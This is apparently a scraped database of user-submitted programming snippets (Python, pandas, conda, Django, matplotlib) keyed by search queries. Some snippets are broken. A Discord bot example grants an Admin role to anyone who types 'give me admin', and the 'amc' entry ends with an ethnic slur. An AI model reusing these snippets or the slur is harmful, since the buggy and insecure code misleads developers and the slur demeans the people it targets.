    "keyword": null,
    "link": null,
    "title": " add conda env to jupyter",
    "description": "source activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\" \npython -m ipykernel install --user --name=firstEnv\nsource activate myenv python -m ipykernel install --user --name myenv --display-name \"Python (myenv)\"\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 269,
    "keyword": null,
    "link": null,
    "title": " add element to heap python",
    "description": "import heapq H = [21,1,45,78,3,5] # Covert to a heap heapq.heapify(H) print(H) # Add element heapq.heappush(H,8) print(H)\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 270,
    "keyword": null,
    "link": null,
    "title": " add empty column to dataframe pandas",
    "description": ">>> import numpy as np >>> import pandas as pd >>> df = pd.DataFrame({\"A\": [1,2,3], \"B\": [2,3,4]}) >>> df    A  B 0  1  2 1  2  3 2  3  4 >>> df[\"C\"] = \"\" >>> df[\"D\"] = np.nan >>> df    A  B C   D 0  1  2   NaN 1  2  3   NaN 2  3  4   NaN\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 271,
    "keyword": null,
    "link": null,
    "title": " add hour minutes second python",
    "description": "from datetime import timedelta t1 = datetime.time(hours, minutes, second) + timedelta(seconds=s, minutes=m, hours=h)\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 272,
    "keyword": null,
    "link": null,
    "title": " add image to jupyter notebook in markdown",
    "description": "![title](\"img/picture.png\")\n# NB: Cell must be in markdown ![<caption>](image_filename.png) #If notebook is in the same folder as image. ![<caption>](folder/image_filename.png) #If image is in a different folder or url.  #Also, you can manually add image by opening the Edit tab --> Insert Image\n",
    "reg_date": "2021-10-12T11:27:54.000Z"
  },
  {
    "id": 273,
    "keyword": null,
    "link": null,
    "title": " add images in readme github file",
    "description": "You can also use relative paths like  ![Alt text](relative/path/to/img.jpg?raw=true \"Title\") Also try the following with the desired .fileExtention:  ![plot](./directory_1/directory_2/.../directory_n/plot.png)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 274,
    "keyword": null,
    "link": null,
    "title": " add list to set python",
    "description": "set.update() or |=  >>> a = set('abc') >>> l = ['d', 'e'] >>> a.update(l) >>> a {'e', 'b', 'c', 'd', 'a'}  >>> l = ['f', 'g'] >>> a |= set(l) >>> a {'e', 'b', 'f', 'c', 'd', 'g', 'a'}\nthisset = {\"apple\", \"banana\", \"cherry\"}  thisset.add(\"orange\")  print(thisset)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 275,
    "keyword": null,
    "link": null,
    "title": " add picture to jupyter notebook",
    "description": "from IPython import display display.Image(\"./image.png\")\n![title](img/picture.png)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 276,
    "keyword": null,
    "link": null,
    "title": " add rows to dataframe pandas",
    "description": "df = df.append({'a':1, 'b':2}, ignore_index=True)\n# append row to dataframe without index  a_row = pd.Series([1, 2]) df = pd.DataFrame([[3, 4], [5, 6]])  row_df = pd.DataFrame([a_row]) df = pd.concat([row_df, df], ignore_index=True)  print(df) # OUTPUT #    0  1 # 0  1  2 # 1  3  4 # 2  5  6  # append row to dataframe with index  a_row = pd.Series([1, 2]) df = pd.DataFrame([[3, 4], [5, 6]], index = [\"row1\", \"row2\"])  row_df = pd.DataFrame([a_row], index = [\"row3\"]) df = pd.concat([row_df, df])  print(df) # OUTPUT #       0  1 # row3  1  2 # row1  3  4 # row2  5  6\ndf = df.append({'index1': value1, 'index2':value2,...}, ignore_index=True)\ndf = pd.DataFrame({     'a':[1,2,3],     'b':[5,6,7] })  df2 = pd.DataFrame({     'a':[11,12,13],     'b':[15,16,17] })  df = df.append(df2, ignore_index = True )  print(df)\nimport pandas as pd  data = {'name': ['Somu', 'Kiku', 'Amol', 'Lini'], \t'physics': [68, 74, 77, 78], \t'chemistry': [84, 56, 73, 69], \t'algebra': [78, 88, 82, 87]}  \t #create dataframe df_marks = pd.DataFrame(data) print('Original DataFrame\\n------------------') print(df_marks)  new_row = {'name':'Geo', 'physics':87, 'chemistry':92, 'algebra':97} #append row to the dataframe df_marks = df_marks.append(new_row, ignore_index=True)  print('\\n\\nNew row added to DataFrame\\n--------------------------') print(df_marks)\n# Add a new row at index k with values provided in list dfObj.loc['k'] = ['Smriti', 26, 'Bangalore', 'India'] \n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 277,
    "keyword": null,
    "link": null,
    "title": " add search field to django admin",
    "description": "class Admin(admin.ModelAdmin):     search_fields = ['name', 'last_name',...]\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 278,
    "keyword": null,
    "link": null,
    "title": " add seconds to datetime python",
    "description": "from datetime import datetime, timedelta x = datetime.now() + timedelta(seconds=3) x += timedelta(seconds=3)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 279,
    "keyword": null,
    "link": null,
    "title": " add self role with discord bot python",
    "description": "@async def on_message(message):      if message.content == \"give me admin\"            role = discord.utils.get(server.roles, name=\"Admin\")            await client.add_roles(message.author.id, role)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 280,
    "keyword": null,
    "link": null,
    "title": " add sheet to existing workbook openpyxl",
    "description": "from openpyxl.workbook import Workbook  wb = Workbook()  ws1 = wb.create_sheet(\"Sheet1\") ws1.title = \"Title1\" ws2 = wb.create_sheet(\"Sheet2\") ws2.title = \"Title2\"  wb.save(filename=\"filename.xlsx\")\n 1from openpyxl.workbook import Workbook  2  3wb = Workbook()  4  5ws1 = wb.create_sheet(\"Sheet_A\")  6ws1.title = \"Title_A\"  7  8ws2 = wb.create_sheet(\"Sheet_B\", 0)  9ws2.title = \"Title_B\" 10 11wb.save(filename = 'sample_book.xlsx')\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 281,
    "keyword": null,
    "link": null,
    "title": " add something to list python",
    "description": "#append to list lst = [1, 2, 3] something = 4 lst.append(something) #lst is now [1, 2, 3, 4]\nmyList = [1, 2, 3]  myList.append(4)\nmyList = [] myList.append(value_to_add)\nMyList = [\"apple\", \"banana\", \"orange\"]  MyList.append(\"raspberry\") # MyList is now [apple, banana, orange, raspberry]\nlist_of_names=[\"Bill\", \"John\", \"Susan\", \"Bob\", \"Emma\",\"Katherine\"] new_name=\"James\" list_of_names.append(new_name) # The list is now [\"Bill\", \"John\", \"Susan\", \"Bob\", \"Emma\",\"Katherine\", \"James\"]\na_list = [1,2,3] a_list.append(4)\n",
    "reg_date": "2021-10-12T11:27:55.000Z"
  },
  {
    "id": 282,
    "keyword": null,
    "link": null,
    "title": " add text to plot python",
    "description": "import matplotlib.pyplot as plt w = 4 h = 3 d = 70 plt.figure(figsize=(w, h), dpi=d) x = [1, 2, 4] x_pos = 0.5 y_pos = 3 plt.text(x_pos, y_pos, \"text on plot\") plt.plot(x) plt.savefig(\"out.png\")Outputout.png\ny = [2.56422, 3.77284, 3.52623, 3.51468, 3.02199] z = [0.15, 0.3, 0.45, 0.6, 0.75] n = [58, 651, 393, 203, 123]  fig, ax = plt.subplots() ax.scatter(z, y)  for i, txt in enumerate(n):     ax.annotate(txt, (z[i], y[i]))\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 283,
    "keyword": null,
    "link": null,
    "title": " add text toimage cv2",
    "description": "#  cv2.putText(image,\"Hello World!!!\", (x,y), cv2.CV_FONT_HERSHEY_SIMPLEX, 2, 255)\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 284,
    "keyword": null,
    "link": null,
    "title": " add x axis label python",
    "description": "plt.xlabel(\"X axis label\")\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 285,
    "keyword": null,
    "link": null,
    "title": " add year to id django",
    "description": "import datetime from uuid import uuid4 def create_id():     now = datetime.datetime.now()     return str(now.year)+str(now.month)+str(now.day)+str(uuid4())[:7]    # in your model: id = models.CharField(primary_key=True, default=create_id, editable=False)\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 286,
    "keyword": null,
    "link": null,
    "title": " addition in python",
    "description": "#  With inputs Number1 = int(input(\"Write the first number:- \")) Number2 = int(input(\"Write the second number:- \")) Sum = Number1 + Number2 print(Sum)\n#+ is the addition symbol in Python, so: print(6 + 4) #output: 10\na = int(input(\"Enter first number:\")) b = int(input(\"Enter second number:\")) sum = a+b print(sum)\n# This program adds two numbers  num1 = 1.5 num2 = 6.3  # Add two numbers sum = float(num1) + float(num2)  # Display the sum print('The sum of {0} and {1} is {2}'.format(num1, num2, sum)) \n# Store input numbers num1 = input('Enter first number: ') num2 = input('Enter second number: ')  # Add two numbers sum = float(num1) + float(num2)  # Display the sum print('The sum of {0} and {1} is {2}'.format(num1, num2, sum))\na = int(input()) b = int(input()) s = a+b print(S)\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 287,
    "keyword": null,
    "link": null,
    "title": " adjust tick label size matplotlib",
    "description": "plt.xticks(fontsize=)\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 288,
    "keyword": null,
    "link": null,
    "title": " advanced calculator in python",
    "description": "def add(n1, n2):   return n1 + n2  def subtract(n1, n2):   return n1 - n2  def multiply(n1, n2):   return n1 * n2  def divide(n1, n2):   return n1 / n2  operations = {   \"+\": add,   \"-\": subtract,   \"*\": multiply,   \"/\": divide }  def calculator():   try:     num1 = float(input(\"Enter first number?: \"))     for symbol in operations:       print(symbol)     operation_symbol = input(\"Pick an operation: \")     if operation_symbol not in operations:       return \"Opration choosen is not valid\"     num2 = float(input(\"Enter second number?: \"))     calculation_function = operations[operation_symbol]     answer = calculation_function(num1, num2)   except:     return \"An error happened because of your input try again\"   return(f\"{num1} {operation_symbol} {num2} = {answer}\")  while True:   print(calculator())   to_continue = input(\"Type 'y' to do more calculations, or type 'n' to exit the app:- \").lower()   if to_continue == 'y':     continue   elif to_continue == \"n\":     print(\"Exiting The App\")     break   \n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 289,
    "keyword": null,
    "link": null,
    "title": " advanced coffee machine in python",
    "description": "import os MENU = {     \"espresso\": {         \"ingredients\": {             \"water\": 50,             \"coffee\": 18,         },         \"cost\": 2,     },     \"latte\": {         \"ingredients\": {             \"water\": 200,             \"milk\": 150,             \"coffee\": 24,         },         \"cost\": 5,     },     \"cappuccino\": {         \"ingredients\": {             \"water\": 250,             \"milk\": 100,             \"coffee\": 24,         },         \"cost\": 15,     } }  profit = 0 resources = {     \"water\": 1000,     \"milk\": 700,     \"coffee\": 500, }   def is_resource_sufficient(order_ingredients):     \"\"\"Returns True when order can be made, False if ingredients are insufficient.\"\"\"     for item in order_ingredients:         if order_ingredients[item] > resources[item]:             print(f\"​Sorry there is not enough {item}.\")             return False     return True   def process_coins():     \"\"\"Returns the total calculated from coins inserted.\"\"\"     print(\"Please insert coins.\")     total = int(input(\"how many quarters?: \")) * 0.25     total += int(input(\"how many dimes?: \")) * 0.1     total += int(input(\"how many nickles?: \")) * 0.05     total += int(input(\"how many pennies?: \")) * 0.01     return total  def Buy_the_resorses():     global resources     resources = {     \"water\": 1000,     \"milk\": 1000,     \"coffee\": 700,     }  def is_transaction_successful(money_received, drink_cost):     \"\"\"Return True when the payment is accepted, or False if money is insufficient.\"\"\"     if money_received >= drink_cost:         change = round(money_received - drink_cost, 2)         print(f\"Here is ${change} in change.\")         global profit         profit += drink_cost         return True     else:         print(\"Sorry that's not enough money. Money refunded.\")         return False   def make_coffee(drink_name, order_ingredients):     \"\"\"Deduct the required ingredients from the resources.\"\"\"     for item in order_ingredients:         resources[item] -= order_ingredients[item]     print(f\"Here is your {drink_name} ☕️. Enjoy!\")   is_on = True  while is_on:     try:         choice = str(input(\"​What would you like? (espresso / latte / cappuccino): \"))         if choice == \"off\":             is_on = False         elif choice == \"report\":             print(f\"Water: {resources['water']}ml\")             print(f\"Milk: {resources['milk']}ml\")             print(f\"Coffee: {resources['coffee']}g\")             print(f\"Money: ${profit}\")         elif choice == \"Buy the resorses\":             Buy_the_resorses()             profit -= 10         elif choice == \"clear\":             os.system(\"cls\")         else:             drink = MENU[choice]             if is_resource_sufficient(drink[\"ingredients\"]):                 payment = process_coins()                 if is_transaction_successful(payment, drink[\"cost\"]):                     make_coffee(choice, drink[\"ingredients\"])     except :         print(\"An unexpected error occurred\")         print(\"try again\")\n",
    "reg_date": "2021-10-12T11:27:56.000Z"
  },
  {
    "id": 290,
    "keyword": null,
    "link": null,
    "title": " age calculator in python",
    "description": "from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\nYear_of_birth = int(input(\"In which year you took birth:- \")) current_year = datetime.datetime.now().year Current_age = current_year - Year_of_birth print(\"Your current age is \",Current_age)\n#Python Calculate Age from date of birth:  from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 291,
    "keyword": null,
    "link": null,
    "title": " alarm when code finishes",
    "description": "import winsound duration = 1000  # milliseconds freq = 440  # Hz winsound.Beep(freq, duration)\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 292,
    "keyword": null,
    "link": null,
    "title": " albert pretrained example",
    "description": " from transformers import AlbertTokenizer, AlbertForQuestionAnswering import torch  tokenizer = AlbertTokenizer.from_pretrained('albert-base-v2') model = AlbertForQuestionAnswering.from_pretrained('albert-base-v2') question, text = \"Who was Jim Henson?\", \"Jim Henson was a nice puppet\" input_dict = tokenizer.encode_plus(question, text, return_tensors='pt') start_scores, end_scores = model(**input_dict) \n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 293,
    "keyword": null,
    "link": null,
    "title": " alex john",
    "description": "for alexJohn in X: \tprint('https://alexjohn.com')\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 294,
    "keyword": null,
    "link": null,
    "title": " all characters python",
    "description": "'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\nimport string  # all the lowercase and uppercase letters print(string.ascii_letters) # every printable key on your keyboard print(string.printable) # every digit print(string.digits)\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 295,
    "keyword": null,
    "link": null,
    "title": " all permutation from 2 arrays python",
    "description": ">>> import itertools >>> a = ['foo', 'bar', 'baz'] >>> b = ['x', 'y', 'z', 'w']  >>> for r in itertools.product(a, b): print r[0] + r[1] foox fooy fooz foow barx bary barz barw bazx bazy bazz bazw \n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 296,
    "keyword": null,
    "link": null,
    "title": " all permutations python",
    "description": "import itertools print(list(itertools.permutations([1,2,3])))\nthislist = [\"apple\", \"banana\", \"cherry\"] print(thislist[1])\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 297,
    "keyword": null,
    "link": null,
    "title": " all pygame keys",
    "description": "All the constants used to represent keys in pygame: Constant      ASCII   Description --------------------------------- K_BACKSPACE   \\b      backspace K_TAB         \\t      tab K_CLEAR               clear K_RETURN      \\r      return K_PAUSE               pause K_ESCAPE      ^[      escape K_SPACE               space K_EXCLAIM     !       exclaim K_QUOTEDBL    \"       quotedbl K_HASH        #       hash K_DOLLAR      $       dollar K_AMPERSAND   &       ampersand K_QUOTE               quote K_LEFTPAREN   (       left parenthesis K_RIGHTPAREN  )       right parenthesis K_ASTERISK    *       asterisk K_PLUS        +       plus sign K_COMMA       ,       comma K_MINUS       -       minus sign K_PERIOD      .       period K_SLASH       /       forward slash K_0           0       0 K_1           1       1 K_2           2       2 K_3           3       3 K_4           4       4 K_5           5       5 K_6           6       6 K_7           7       7 K_8           8       8 K_9           9       9 K_COLON       :       colon K_SEMICOLON   ;       semicolon K_LESS        <       less-than sign K_EQUALS      =       equals sign K_GREATER     >       greater-than sign K_QUESTION    ?       question mark K_AT          @       at K_LEFTBRACKET [       left bracket K_BACKSLASH   \\       backslash K_RIGHTBRACKET ]      right bracket K_CARET       ^       caret K_UNDERSCORE  _       underscore K_BACKQUOTE   `       grave K_a           a       a K_b           b       b K_c           c       c K_d           d       d K_e           e       e K_f           f       f K_g           g       g K_h           h       h K_i           i       i K_j           j       j K_k           k       k K_l           l       l K_m           m       m K_n           n       n K_o           o       o K_p           p       p K_q           q       q K_r           r       r K_s           s       s K_t           t       t K_u           u       u K_v           v       v K_w           w       w K_x           x       x K_y           y       y K_z           z       z K_DELETE              delete K_KP0                 keypad 0 K_KP1                 keypad 1 K_KP2                 keypad 2 K_KP3                 keypad 3 K_KP4                 keypad 4 K_KP5                 keypad 5 K_KP6                 keypad 6 K_KP7                 keypad 7 K_KP8                 keypad 8 K_KP9                 keypad 9 K_KP_PERIOD   .       keypad period K_KP_DIVIDE   /       keypad divide K_KP_MULTIPLY *       keypad multiply K_KP_MINUS    -       keypad minus K_KP_PLUS     +       keypad plus K_KP_ENTER    \\r      keypad enter K_KP_EQUALS   =       keypad equals K_UP                  up arrow K_DOWN                down arrow K_RIGHT               right arrow K_LEFT                left arrow K_INSERT              insert K_HOME                home K_END                 end K_PAGEUP              page up K_PAGEDOWN            page down K_F1                  F1 K_F2                  F2 K_F3                  F3 K_F4                  F4 K_F5                  F5 K_F6                  F6 K_F7                  F7 K_F8                  F8 K_F9                  F9 K_F10                 F10 K_F11                 F11 K_F12                 F12 K_F13                 F13 K_F14                 F14 K_F15                 F15 K_NUMLOCK             numlock K_CAPSLOCK            capslock K_SCROLLOCK           scrollock K_RSHIFT              right shift K_LSHIFT              left shift K_RCTRL               right control K_LCTRL               left control K_RALT                right alt K_LALT                left alt K_RMETA               right meta K_LMETA               left meta K_LSUPER              left Windows key K_RSUPER              right Windows key K_MODE                mode shift K_HELP                help K_PRINT               print screen K_SYSREQ              sysrq K_BREAK               break K_MENU                menu K_POWER               power K_EURO                Euro  a list of modifier states (from pygame.localspygame constants) that can be assembled by bitwise-ORing them together:  Constant      Description ------------------------- KMOD_NONE     no modifier keys pressed KMOD_LSHIFT   left shift KMOD_RSHIFT   right shift KMOD_SHIFT    left shift or right shift or both KMOD_LCTRL    left control KMOD_RCTRL    right control KMOD_CTRL     left control or right control or both KMOD_LALT     left alt KMOD_RALT     right alt KMOD_ALT      left alt or right alt or both KMOD_LMETA    left meta KMOD_RMETA    right meta KMOD_META     left meta or right meta or both KMOD_CAPS     caps lock KMOD_NUM      num lock KMOD_MODE     AltGr\nK_ESCAPE\n",
    "reg_date": "2021-10-12T11:27:57.000Z"
  },
  {
    "id": 298,
    "keyword": null,
    "link": null,
    "title": " allauth",
    "description": "1. pip install django-allauth  2. INSTALLED_APPS = [       'django.contrib.auth',       'django.contrib.messages',       'django.contrib.sites',        'allauth',       'allauth.account',       'allauth.socialaccount', \t]  3.\tAUTHENTICATION_BACKENDS = [       'django.contrib.auth.backends.ModelBackend',       'allauth.account.auth_backends.AuthenticationBackend', \t]  4. SITE_ID = 1  5. urlpatterns = [      path('accounts/', include('allauth.urls')), ]\npip install django-allauth \nSOCIALACCOUNT_PROVIDERS = {     'google': {         # For each OAuth based provider, either add a ``SocialApp``         # (``socialaccount`` app) containing the required client         # credentials, or list them here:         'APP': {             'client_id': '123',             'secret': '456',             'key': ''         }     } }\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 299,
    "keyword": null,
    "link": null,
    "title": " alphabet list python",
    "description": "['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n>>> import string >>> string.ascii_lowercase 'abcdefghijklmnopqrstuvwxyz'\n#Python: premade alphabet string   import string string.ascii_lowercase \t#output: 'abcdefghijklmnopqrstuvwxyz' string.ascii_uppercase \t#output: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\na1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" a2 = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"] a3 = \"abcdefghijklmnopqrstuvwxyz\" a4 = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\nfor i in range(ord('a'), ord('z') + 1):   print(chr(i))   # prints all letters in english the alphabet\n ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'] \n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 300,
    "keyword": null,
    "link": null,
    "title": " amazon cli on commadline",
    "description": "python --version\nsudo ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws\nunzip awscli-bundle.zip\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 301,
    "keyword": null,
    "link": null,
    "title": " amc",
    "description": "print('HOLD'*1*10**10000000000000000000000000000000000000000000000000000) amc.landing() gme.landing()\nBUY & HOLD!!!\nHODL YOU FUCKING GOOK\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 302,
    "keyword": null,
    "link": null,
    "title": " an array of dates python",
    "description": "#To change the number of days created change the number of periods ten_days = pd.date_range(start='2021-7-26', periods=10) print(ten_days)\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 303,
    "keyword": null,
    "link": null,
    "title": " anaconda create environment python version",
    "description": "conda create -n myenv python=3.6 \nconda create -n [env-name] python\nconda activate myenv\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 304,
    "keyword": null,
    "link": null,
    "title": " anaconda create new environment",
    "description": "conda create -n myenv python=3.6\nconda info --envs  conda env list\nconda create -n myenv python=x.x\nconda create -n yourenvname python=x.x anaconda\nconda create -n myenv python=3.6 \nconda create -n [env-name] python\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 305,
    "keyword": null,
    "link": null,
    "title": " anaconda install requests",
    "description": "conda install -c anaconda requests\n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 306,
    "keyword": null,
    "link": null,
    "title": " anaconda python update packages",
    "description": "conda update --all \n",
    "reg_date": "2021-10-12T11:27:58.000Z"
  },
  {
    "id": 307,
    "keyword": null,
    "link": null,
    "title": " and condition with or in django",
    "description": "Just adding this for multiple filters attaching to Q object, if someone might be looking to it. If a Q object is provided, it must precede the definition of any keyword arguments. Otherwise its an invalid query. You should be careful when doing it.  an example would be  from django.db.models import Q User.objects.filter(Q(income__gte=5000) | Q(income__isnull=True),category='income')  Here the OR condition and a filter with category of income is taken into account\n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 308,
    "keyword": null,
    "link": null,
    "title": " angle names matplotlib",
    "description": "plt.xticks(rotation=90)\n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 309,
    "keyword": null,
    "link": null,
    "title": " animate loading with itertools in python",
    "description": " import itertools  import threading  import time  import sys   done = False  '|', '/', '-', '\\\\'  def animate():      for c in itertools.cycle(['|', '/', '-', '\\\\']):          if done:              break          sys.stdout.write('\\rAnything You Want Here' + c)          sys.stdout.flush()          time.sleep(0.1)      sys.stdout.write('\\rAnything Here To Run After 1 Second. Note 0.1 = 1 second     ')   t = threading.Thread(target=animate)  t.start()   #long process here  time.sleep(10)  done = True\n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 310,
    "keyword": null,
    "link": null,
    "title": " animate time series python",
    "description": "import numpy as np import matplotlib.pyplot as plt from matplotlib import animation  dt = 0.01 tfinal = 1 x0 = 0  sqrtdt = np.sqrt(dt) n = int(tfinal/dt) xtraj = np.zeros(n+1, float) trange = np.linspace(start=0,stop=tfinal ,num=n+1) xtraj[0] = x0  for i in range(n):     xtraj[i+1] = xtraj[i] + np.random.normal()  x = trange y = xtraj  # animation line plot example  fig, ax = plt.subplots(1, 1, figsize = (6, 6))  def animate(i):     ax.cla() # clear the previous image     ax.plot(x[:i], y[:i]) # plot the line     ax.set_xlim([x0, tfinal]) # fix the x axis     ax.set_ylim([1.1*np.min(y), 1.1*np.max(y)]) # fix the y axis  anim = animation.FuncAnimation(fig, animate, frames = len(x) + 1, interval = 1, blit = False) plt.show() \n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 311,
    "keyword": null,
    "link": null,
    "title": " annaul sum resample pandas",
    "description": "#Downsampling and summing the data that has been aggregated annually data.resample('A').sum()\n",
    "reg_date": "2021-10-12T11:27:59.000Z"
  },
  {
    "id": 312,
    "keyword": null,
    "link": null,
    "title": " ansi colors",
    "description": "public class ConsoleColors {     // Reset     public static final String RESET = \"\\033[0m\";  // Text Reset      // Regular Colors     public static final String BLACK = \"\\033[0;30m\";   // BLACK     public static final String RED = \"\\033[0;31m\";     // RED     public static final String GREEN = \"\\033[0;32m\";   // GREEN     public static final String YELLOW = \"\\033[0;33m\";  // YELLOW     public static final String BLUE = \"\\033[0;34m\";    // BLUE     public static final String PURPLE = \"\\033[0;35m\";  // PURPLE     public static final String CYAN = \"\\033[0;36m\";    // CYAN     public static final String WHITE = \"\\033[0;37m\";   // WHITE      // Bold     public static final String BLACK_BOLD = \"\\033[1;30m\";  // BLACK     public static final String RED_BOLD = \"\\033[1;31m\";    // RED     public static final String GREEN_BOLD = \"\\033[1;32m\";  // GREEN     public static final String YELLOW_BOLD = \"\\033[1;33m\"; // YELLOW     public static final String BLUE_BOLD = \"\\033[1;34m\";   // BLUE     public static final String PURPLE_BOLD = \"\\033[1;35m\"; // PURPLE     public static final String CYAN_BOLD = \"\\033[1;36m\";   // CYAN     public static final String WHITE_BOLD = \"\\033[1;37m\";  // WHITE      // Underline     public static final String BLACK_UNDERLINED = \"\\033[4;30m\";  // BLACK     public static final String RED_UNDERLINED = \"\\033[4;31m\";    // RED     public static final String GREEN_UNDERLINED = \"\\033[4;32m\";  // GREEN     public static final String YELLOW_UNDERLINED = \"\\033[4;33m\"; // YELLOW     public static final String BLUE_UNDERLINED = \"\\033[4;34m\";   // BLUE     public static final String PURPLE_UNDERLINED = \"\\033[4;35m\"; // PURPLE     public static final String CYAN_UNDERLINED = \"\\033[4;36m\";   // CYAN     public static final String WHITE_UNDERLINED = \"\\033[4;37m\";  // WHITE      // Background     public static final String BLACK_BACKGROUND = \"\\033[40m\";  // BLACK     public static final String RED_BACKGROUND = \"\\033[41m\";    // RED     public static final String GREEN_BACKGROUND = \"\\033[42m\";  // GREEN     public static final String YELLOW_BACKGROUND = \"\\033[43m\"; // YELLOW     public static final String BLUE_BACKGROUND = \"\\033[44m\";   // BLUE     public static final String PURPLE_BACKGROUND = \"\\033[45m\"; // PURPLE     public static final String CYAN_BACKGROUND = \"\\033[46m\";   // CYAN     public static final String WHITE_BACKGROUND = \"\\033[47m\";  // WHITE      // High Intensity     public static final String BLACK_BRIGHT = \"\\033[0;90m\";  // BLACK     public static final String RED_BRIGHT = \"\\033[0;91m\";    // RED     public static final String GREEN_BRIGHT = \"\\033[0;92m\";  // GREEN     public static final String YELLOW_BRIGHT = \"\\033[0;93m\"; // YELLOW     public static final String BLUE_BRIGHT = \"\\033[0;94m\";   // BLUE     public static final String PURPLE_BRIGHT = \"\\033[0;95m\"; // PURPLE     public static final String CYAN_BRIGHT = \"\\033[0;96m\";   // CYAN     public static final String WHITE_BRIGHT = \"\\033[0;97m\";  // WHITE      // Bold High Intensity     public static final String BLACK_BOLD_BRIGHT = \"\\033[1;90m\"; // BLACK     public static final String RED_BOLD_BRIGHT = \"\\033[1;91m\";   // RED     public static final String GREEN_BOLD_BRIGHT = \"\\033[1;92m\"; // GREEN     public static final String YELLOW_BOLD_BRIGHT = \"\\033[1;93m\";// YELLOW     public static final String BLUE_BOLD_BRIGHT = \"\\033[1;94m\";  // BLUE     public static final String PURPLE_BOLD_BRIGHT = \"\\033[1;95m\";// PURPLE     public static final String CYAN_BOLD_BRIGHT = \"\\033[1;96m\";  // CYAN     public static final String WHITE_BOLD_BRIGHT = \"\\033[1;97m\"; // WHITE      // High Intensity backgrounds     public static final String BLACK_BACKGROUND_BRIGHT = \"\\033[0;100m\";// BLACK     public static final String RED_BACKGROUND_BRIGHT = \"\\033[0;101m\";// RED     public static final String GREEN_BACKGROUND_BRIGHT = \"\\033[0;102m\";// GREEN     public static final String YELLOW_BACKGROUND_BRIGHT = \"\\033[0;103m\";// YELLOW     public static final String BLUE_BACKGROUND_BRIGHT = \"\\033[0;104m\";// BLUE     public static final String PURPLE_BACKGROUND_BRIGHT = \"\\033[0;105m\"; // PURPLE     public static final String CYAN_BACKGROUND_BRIGHT = \"\\033[0;106m\";  // CYAN     public static final String WHITE_BACKGROUND_BRIGHT = \"\\033[0;107m\";   // WHITE }\nBlack            \\e[0;30m Blue             \\e[0;34m Green            \\e[0;32m Cyan             \\e[0;36m Red              \\e[0;31m Purple           \\e[0;35m Brown            \\e[0;33m Gray             \\e[0;37m Dark Gray        \\e[1;30m Light Blue       \\e[1;34m Light Green      \\e[1;32m Light Cyan       \\e[1;36m Light Red        \\e[1;31m Light 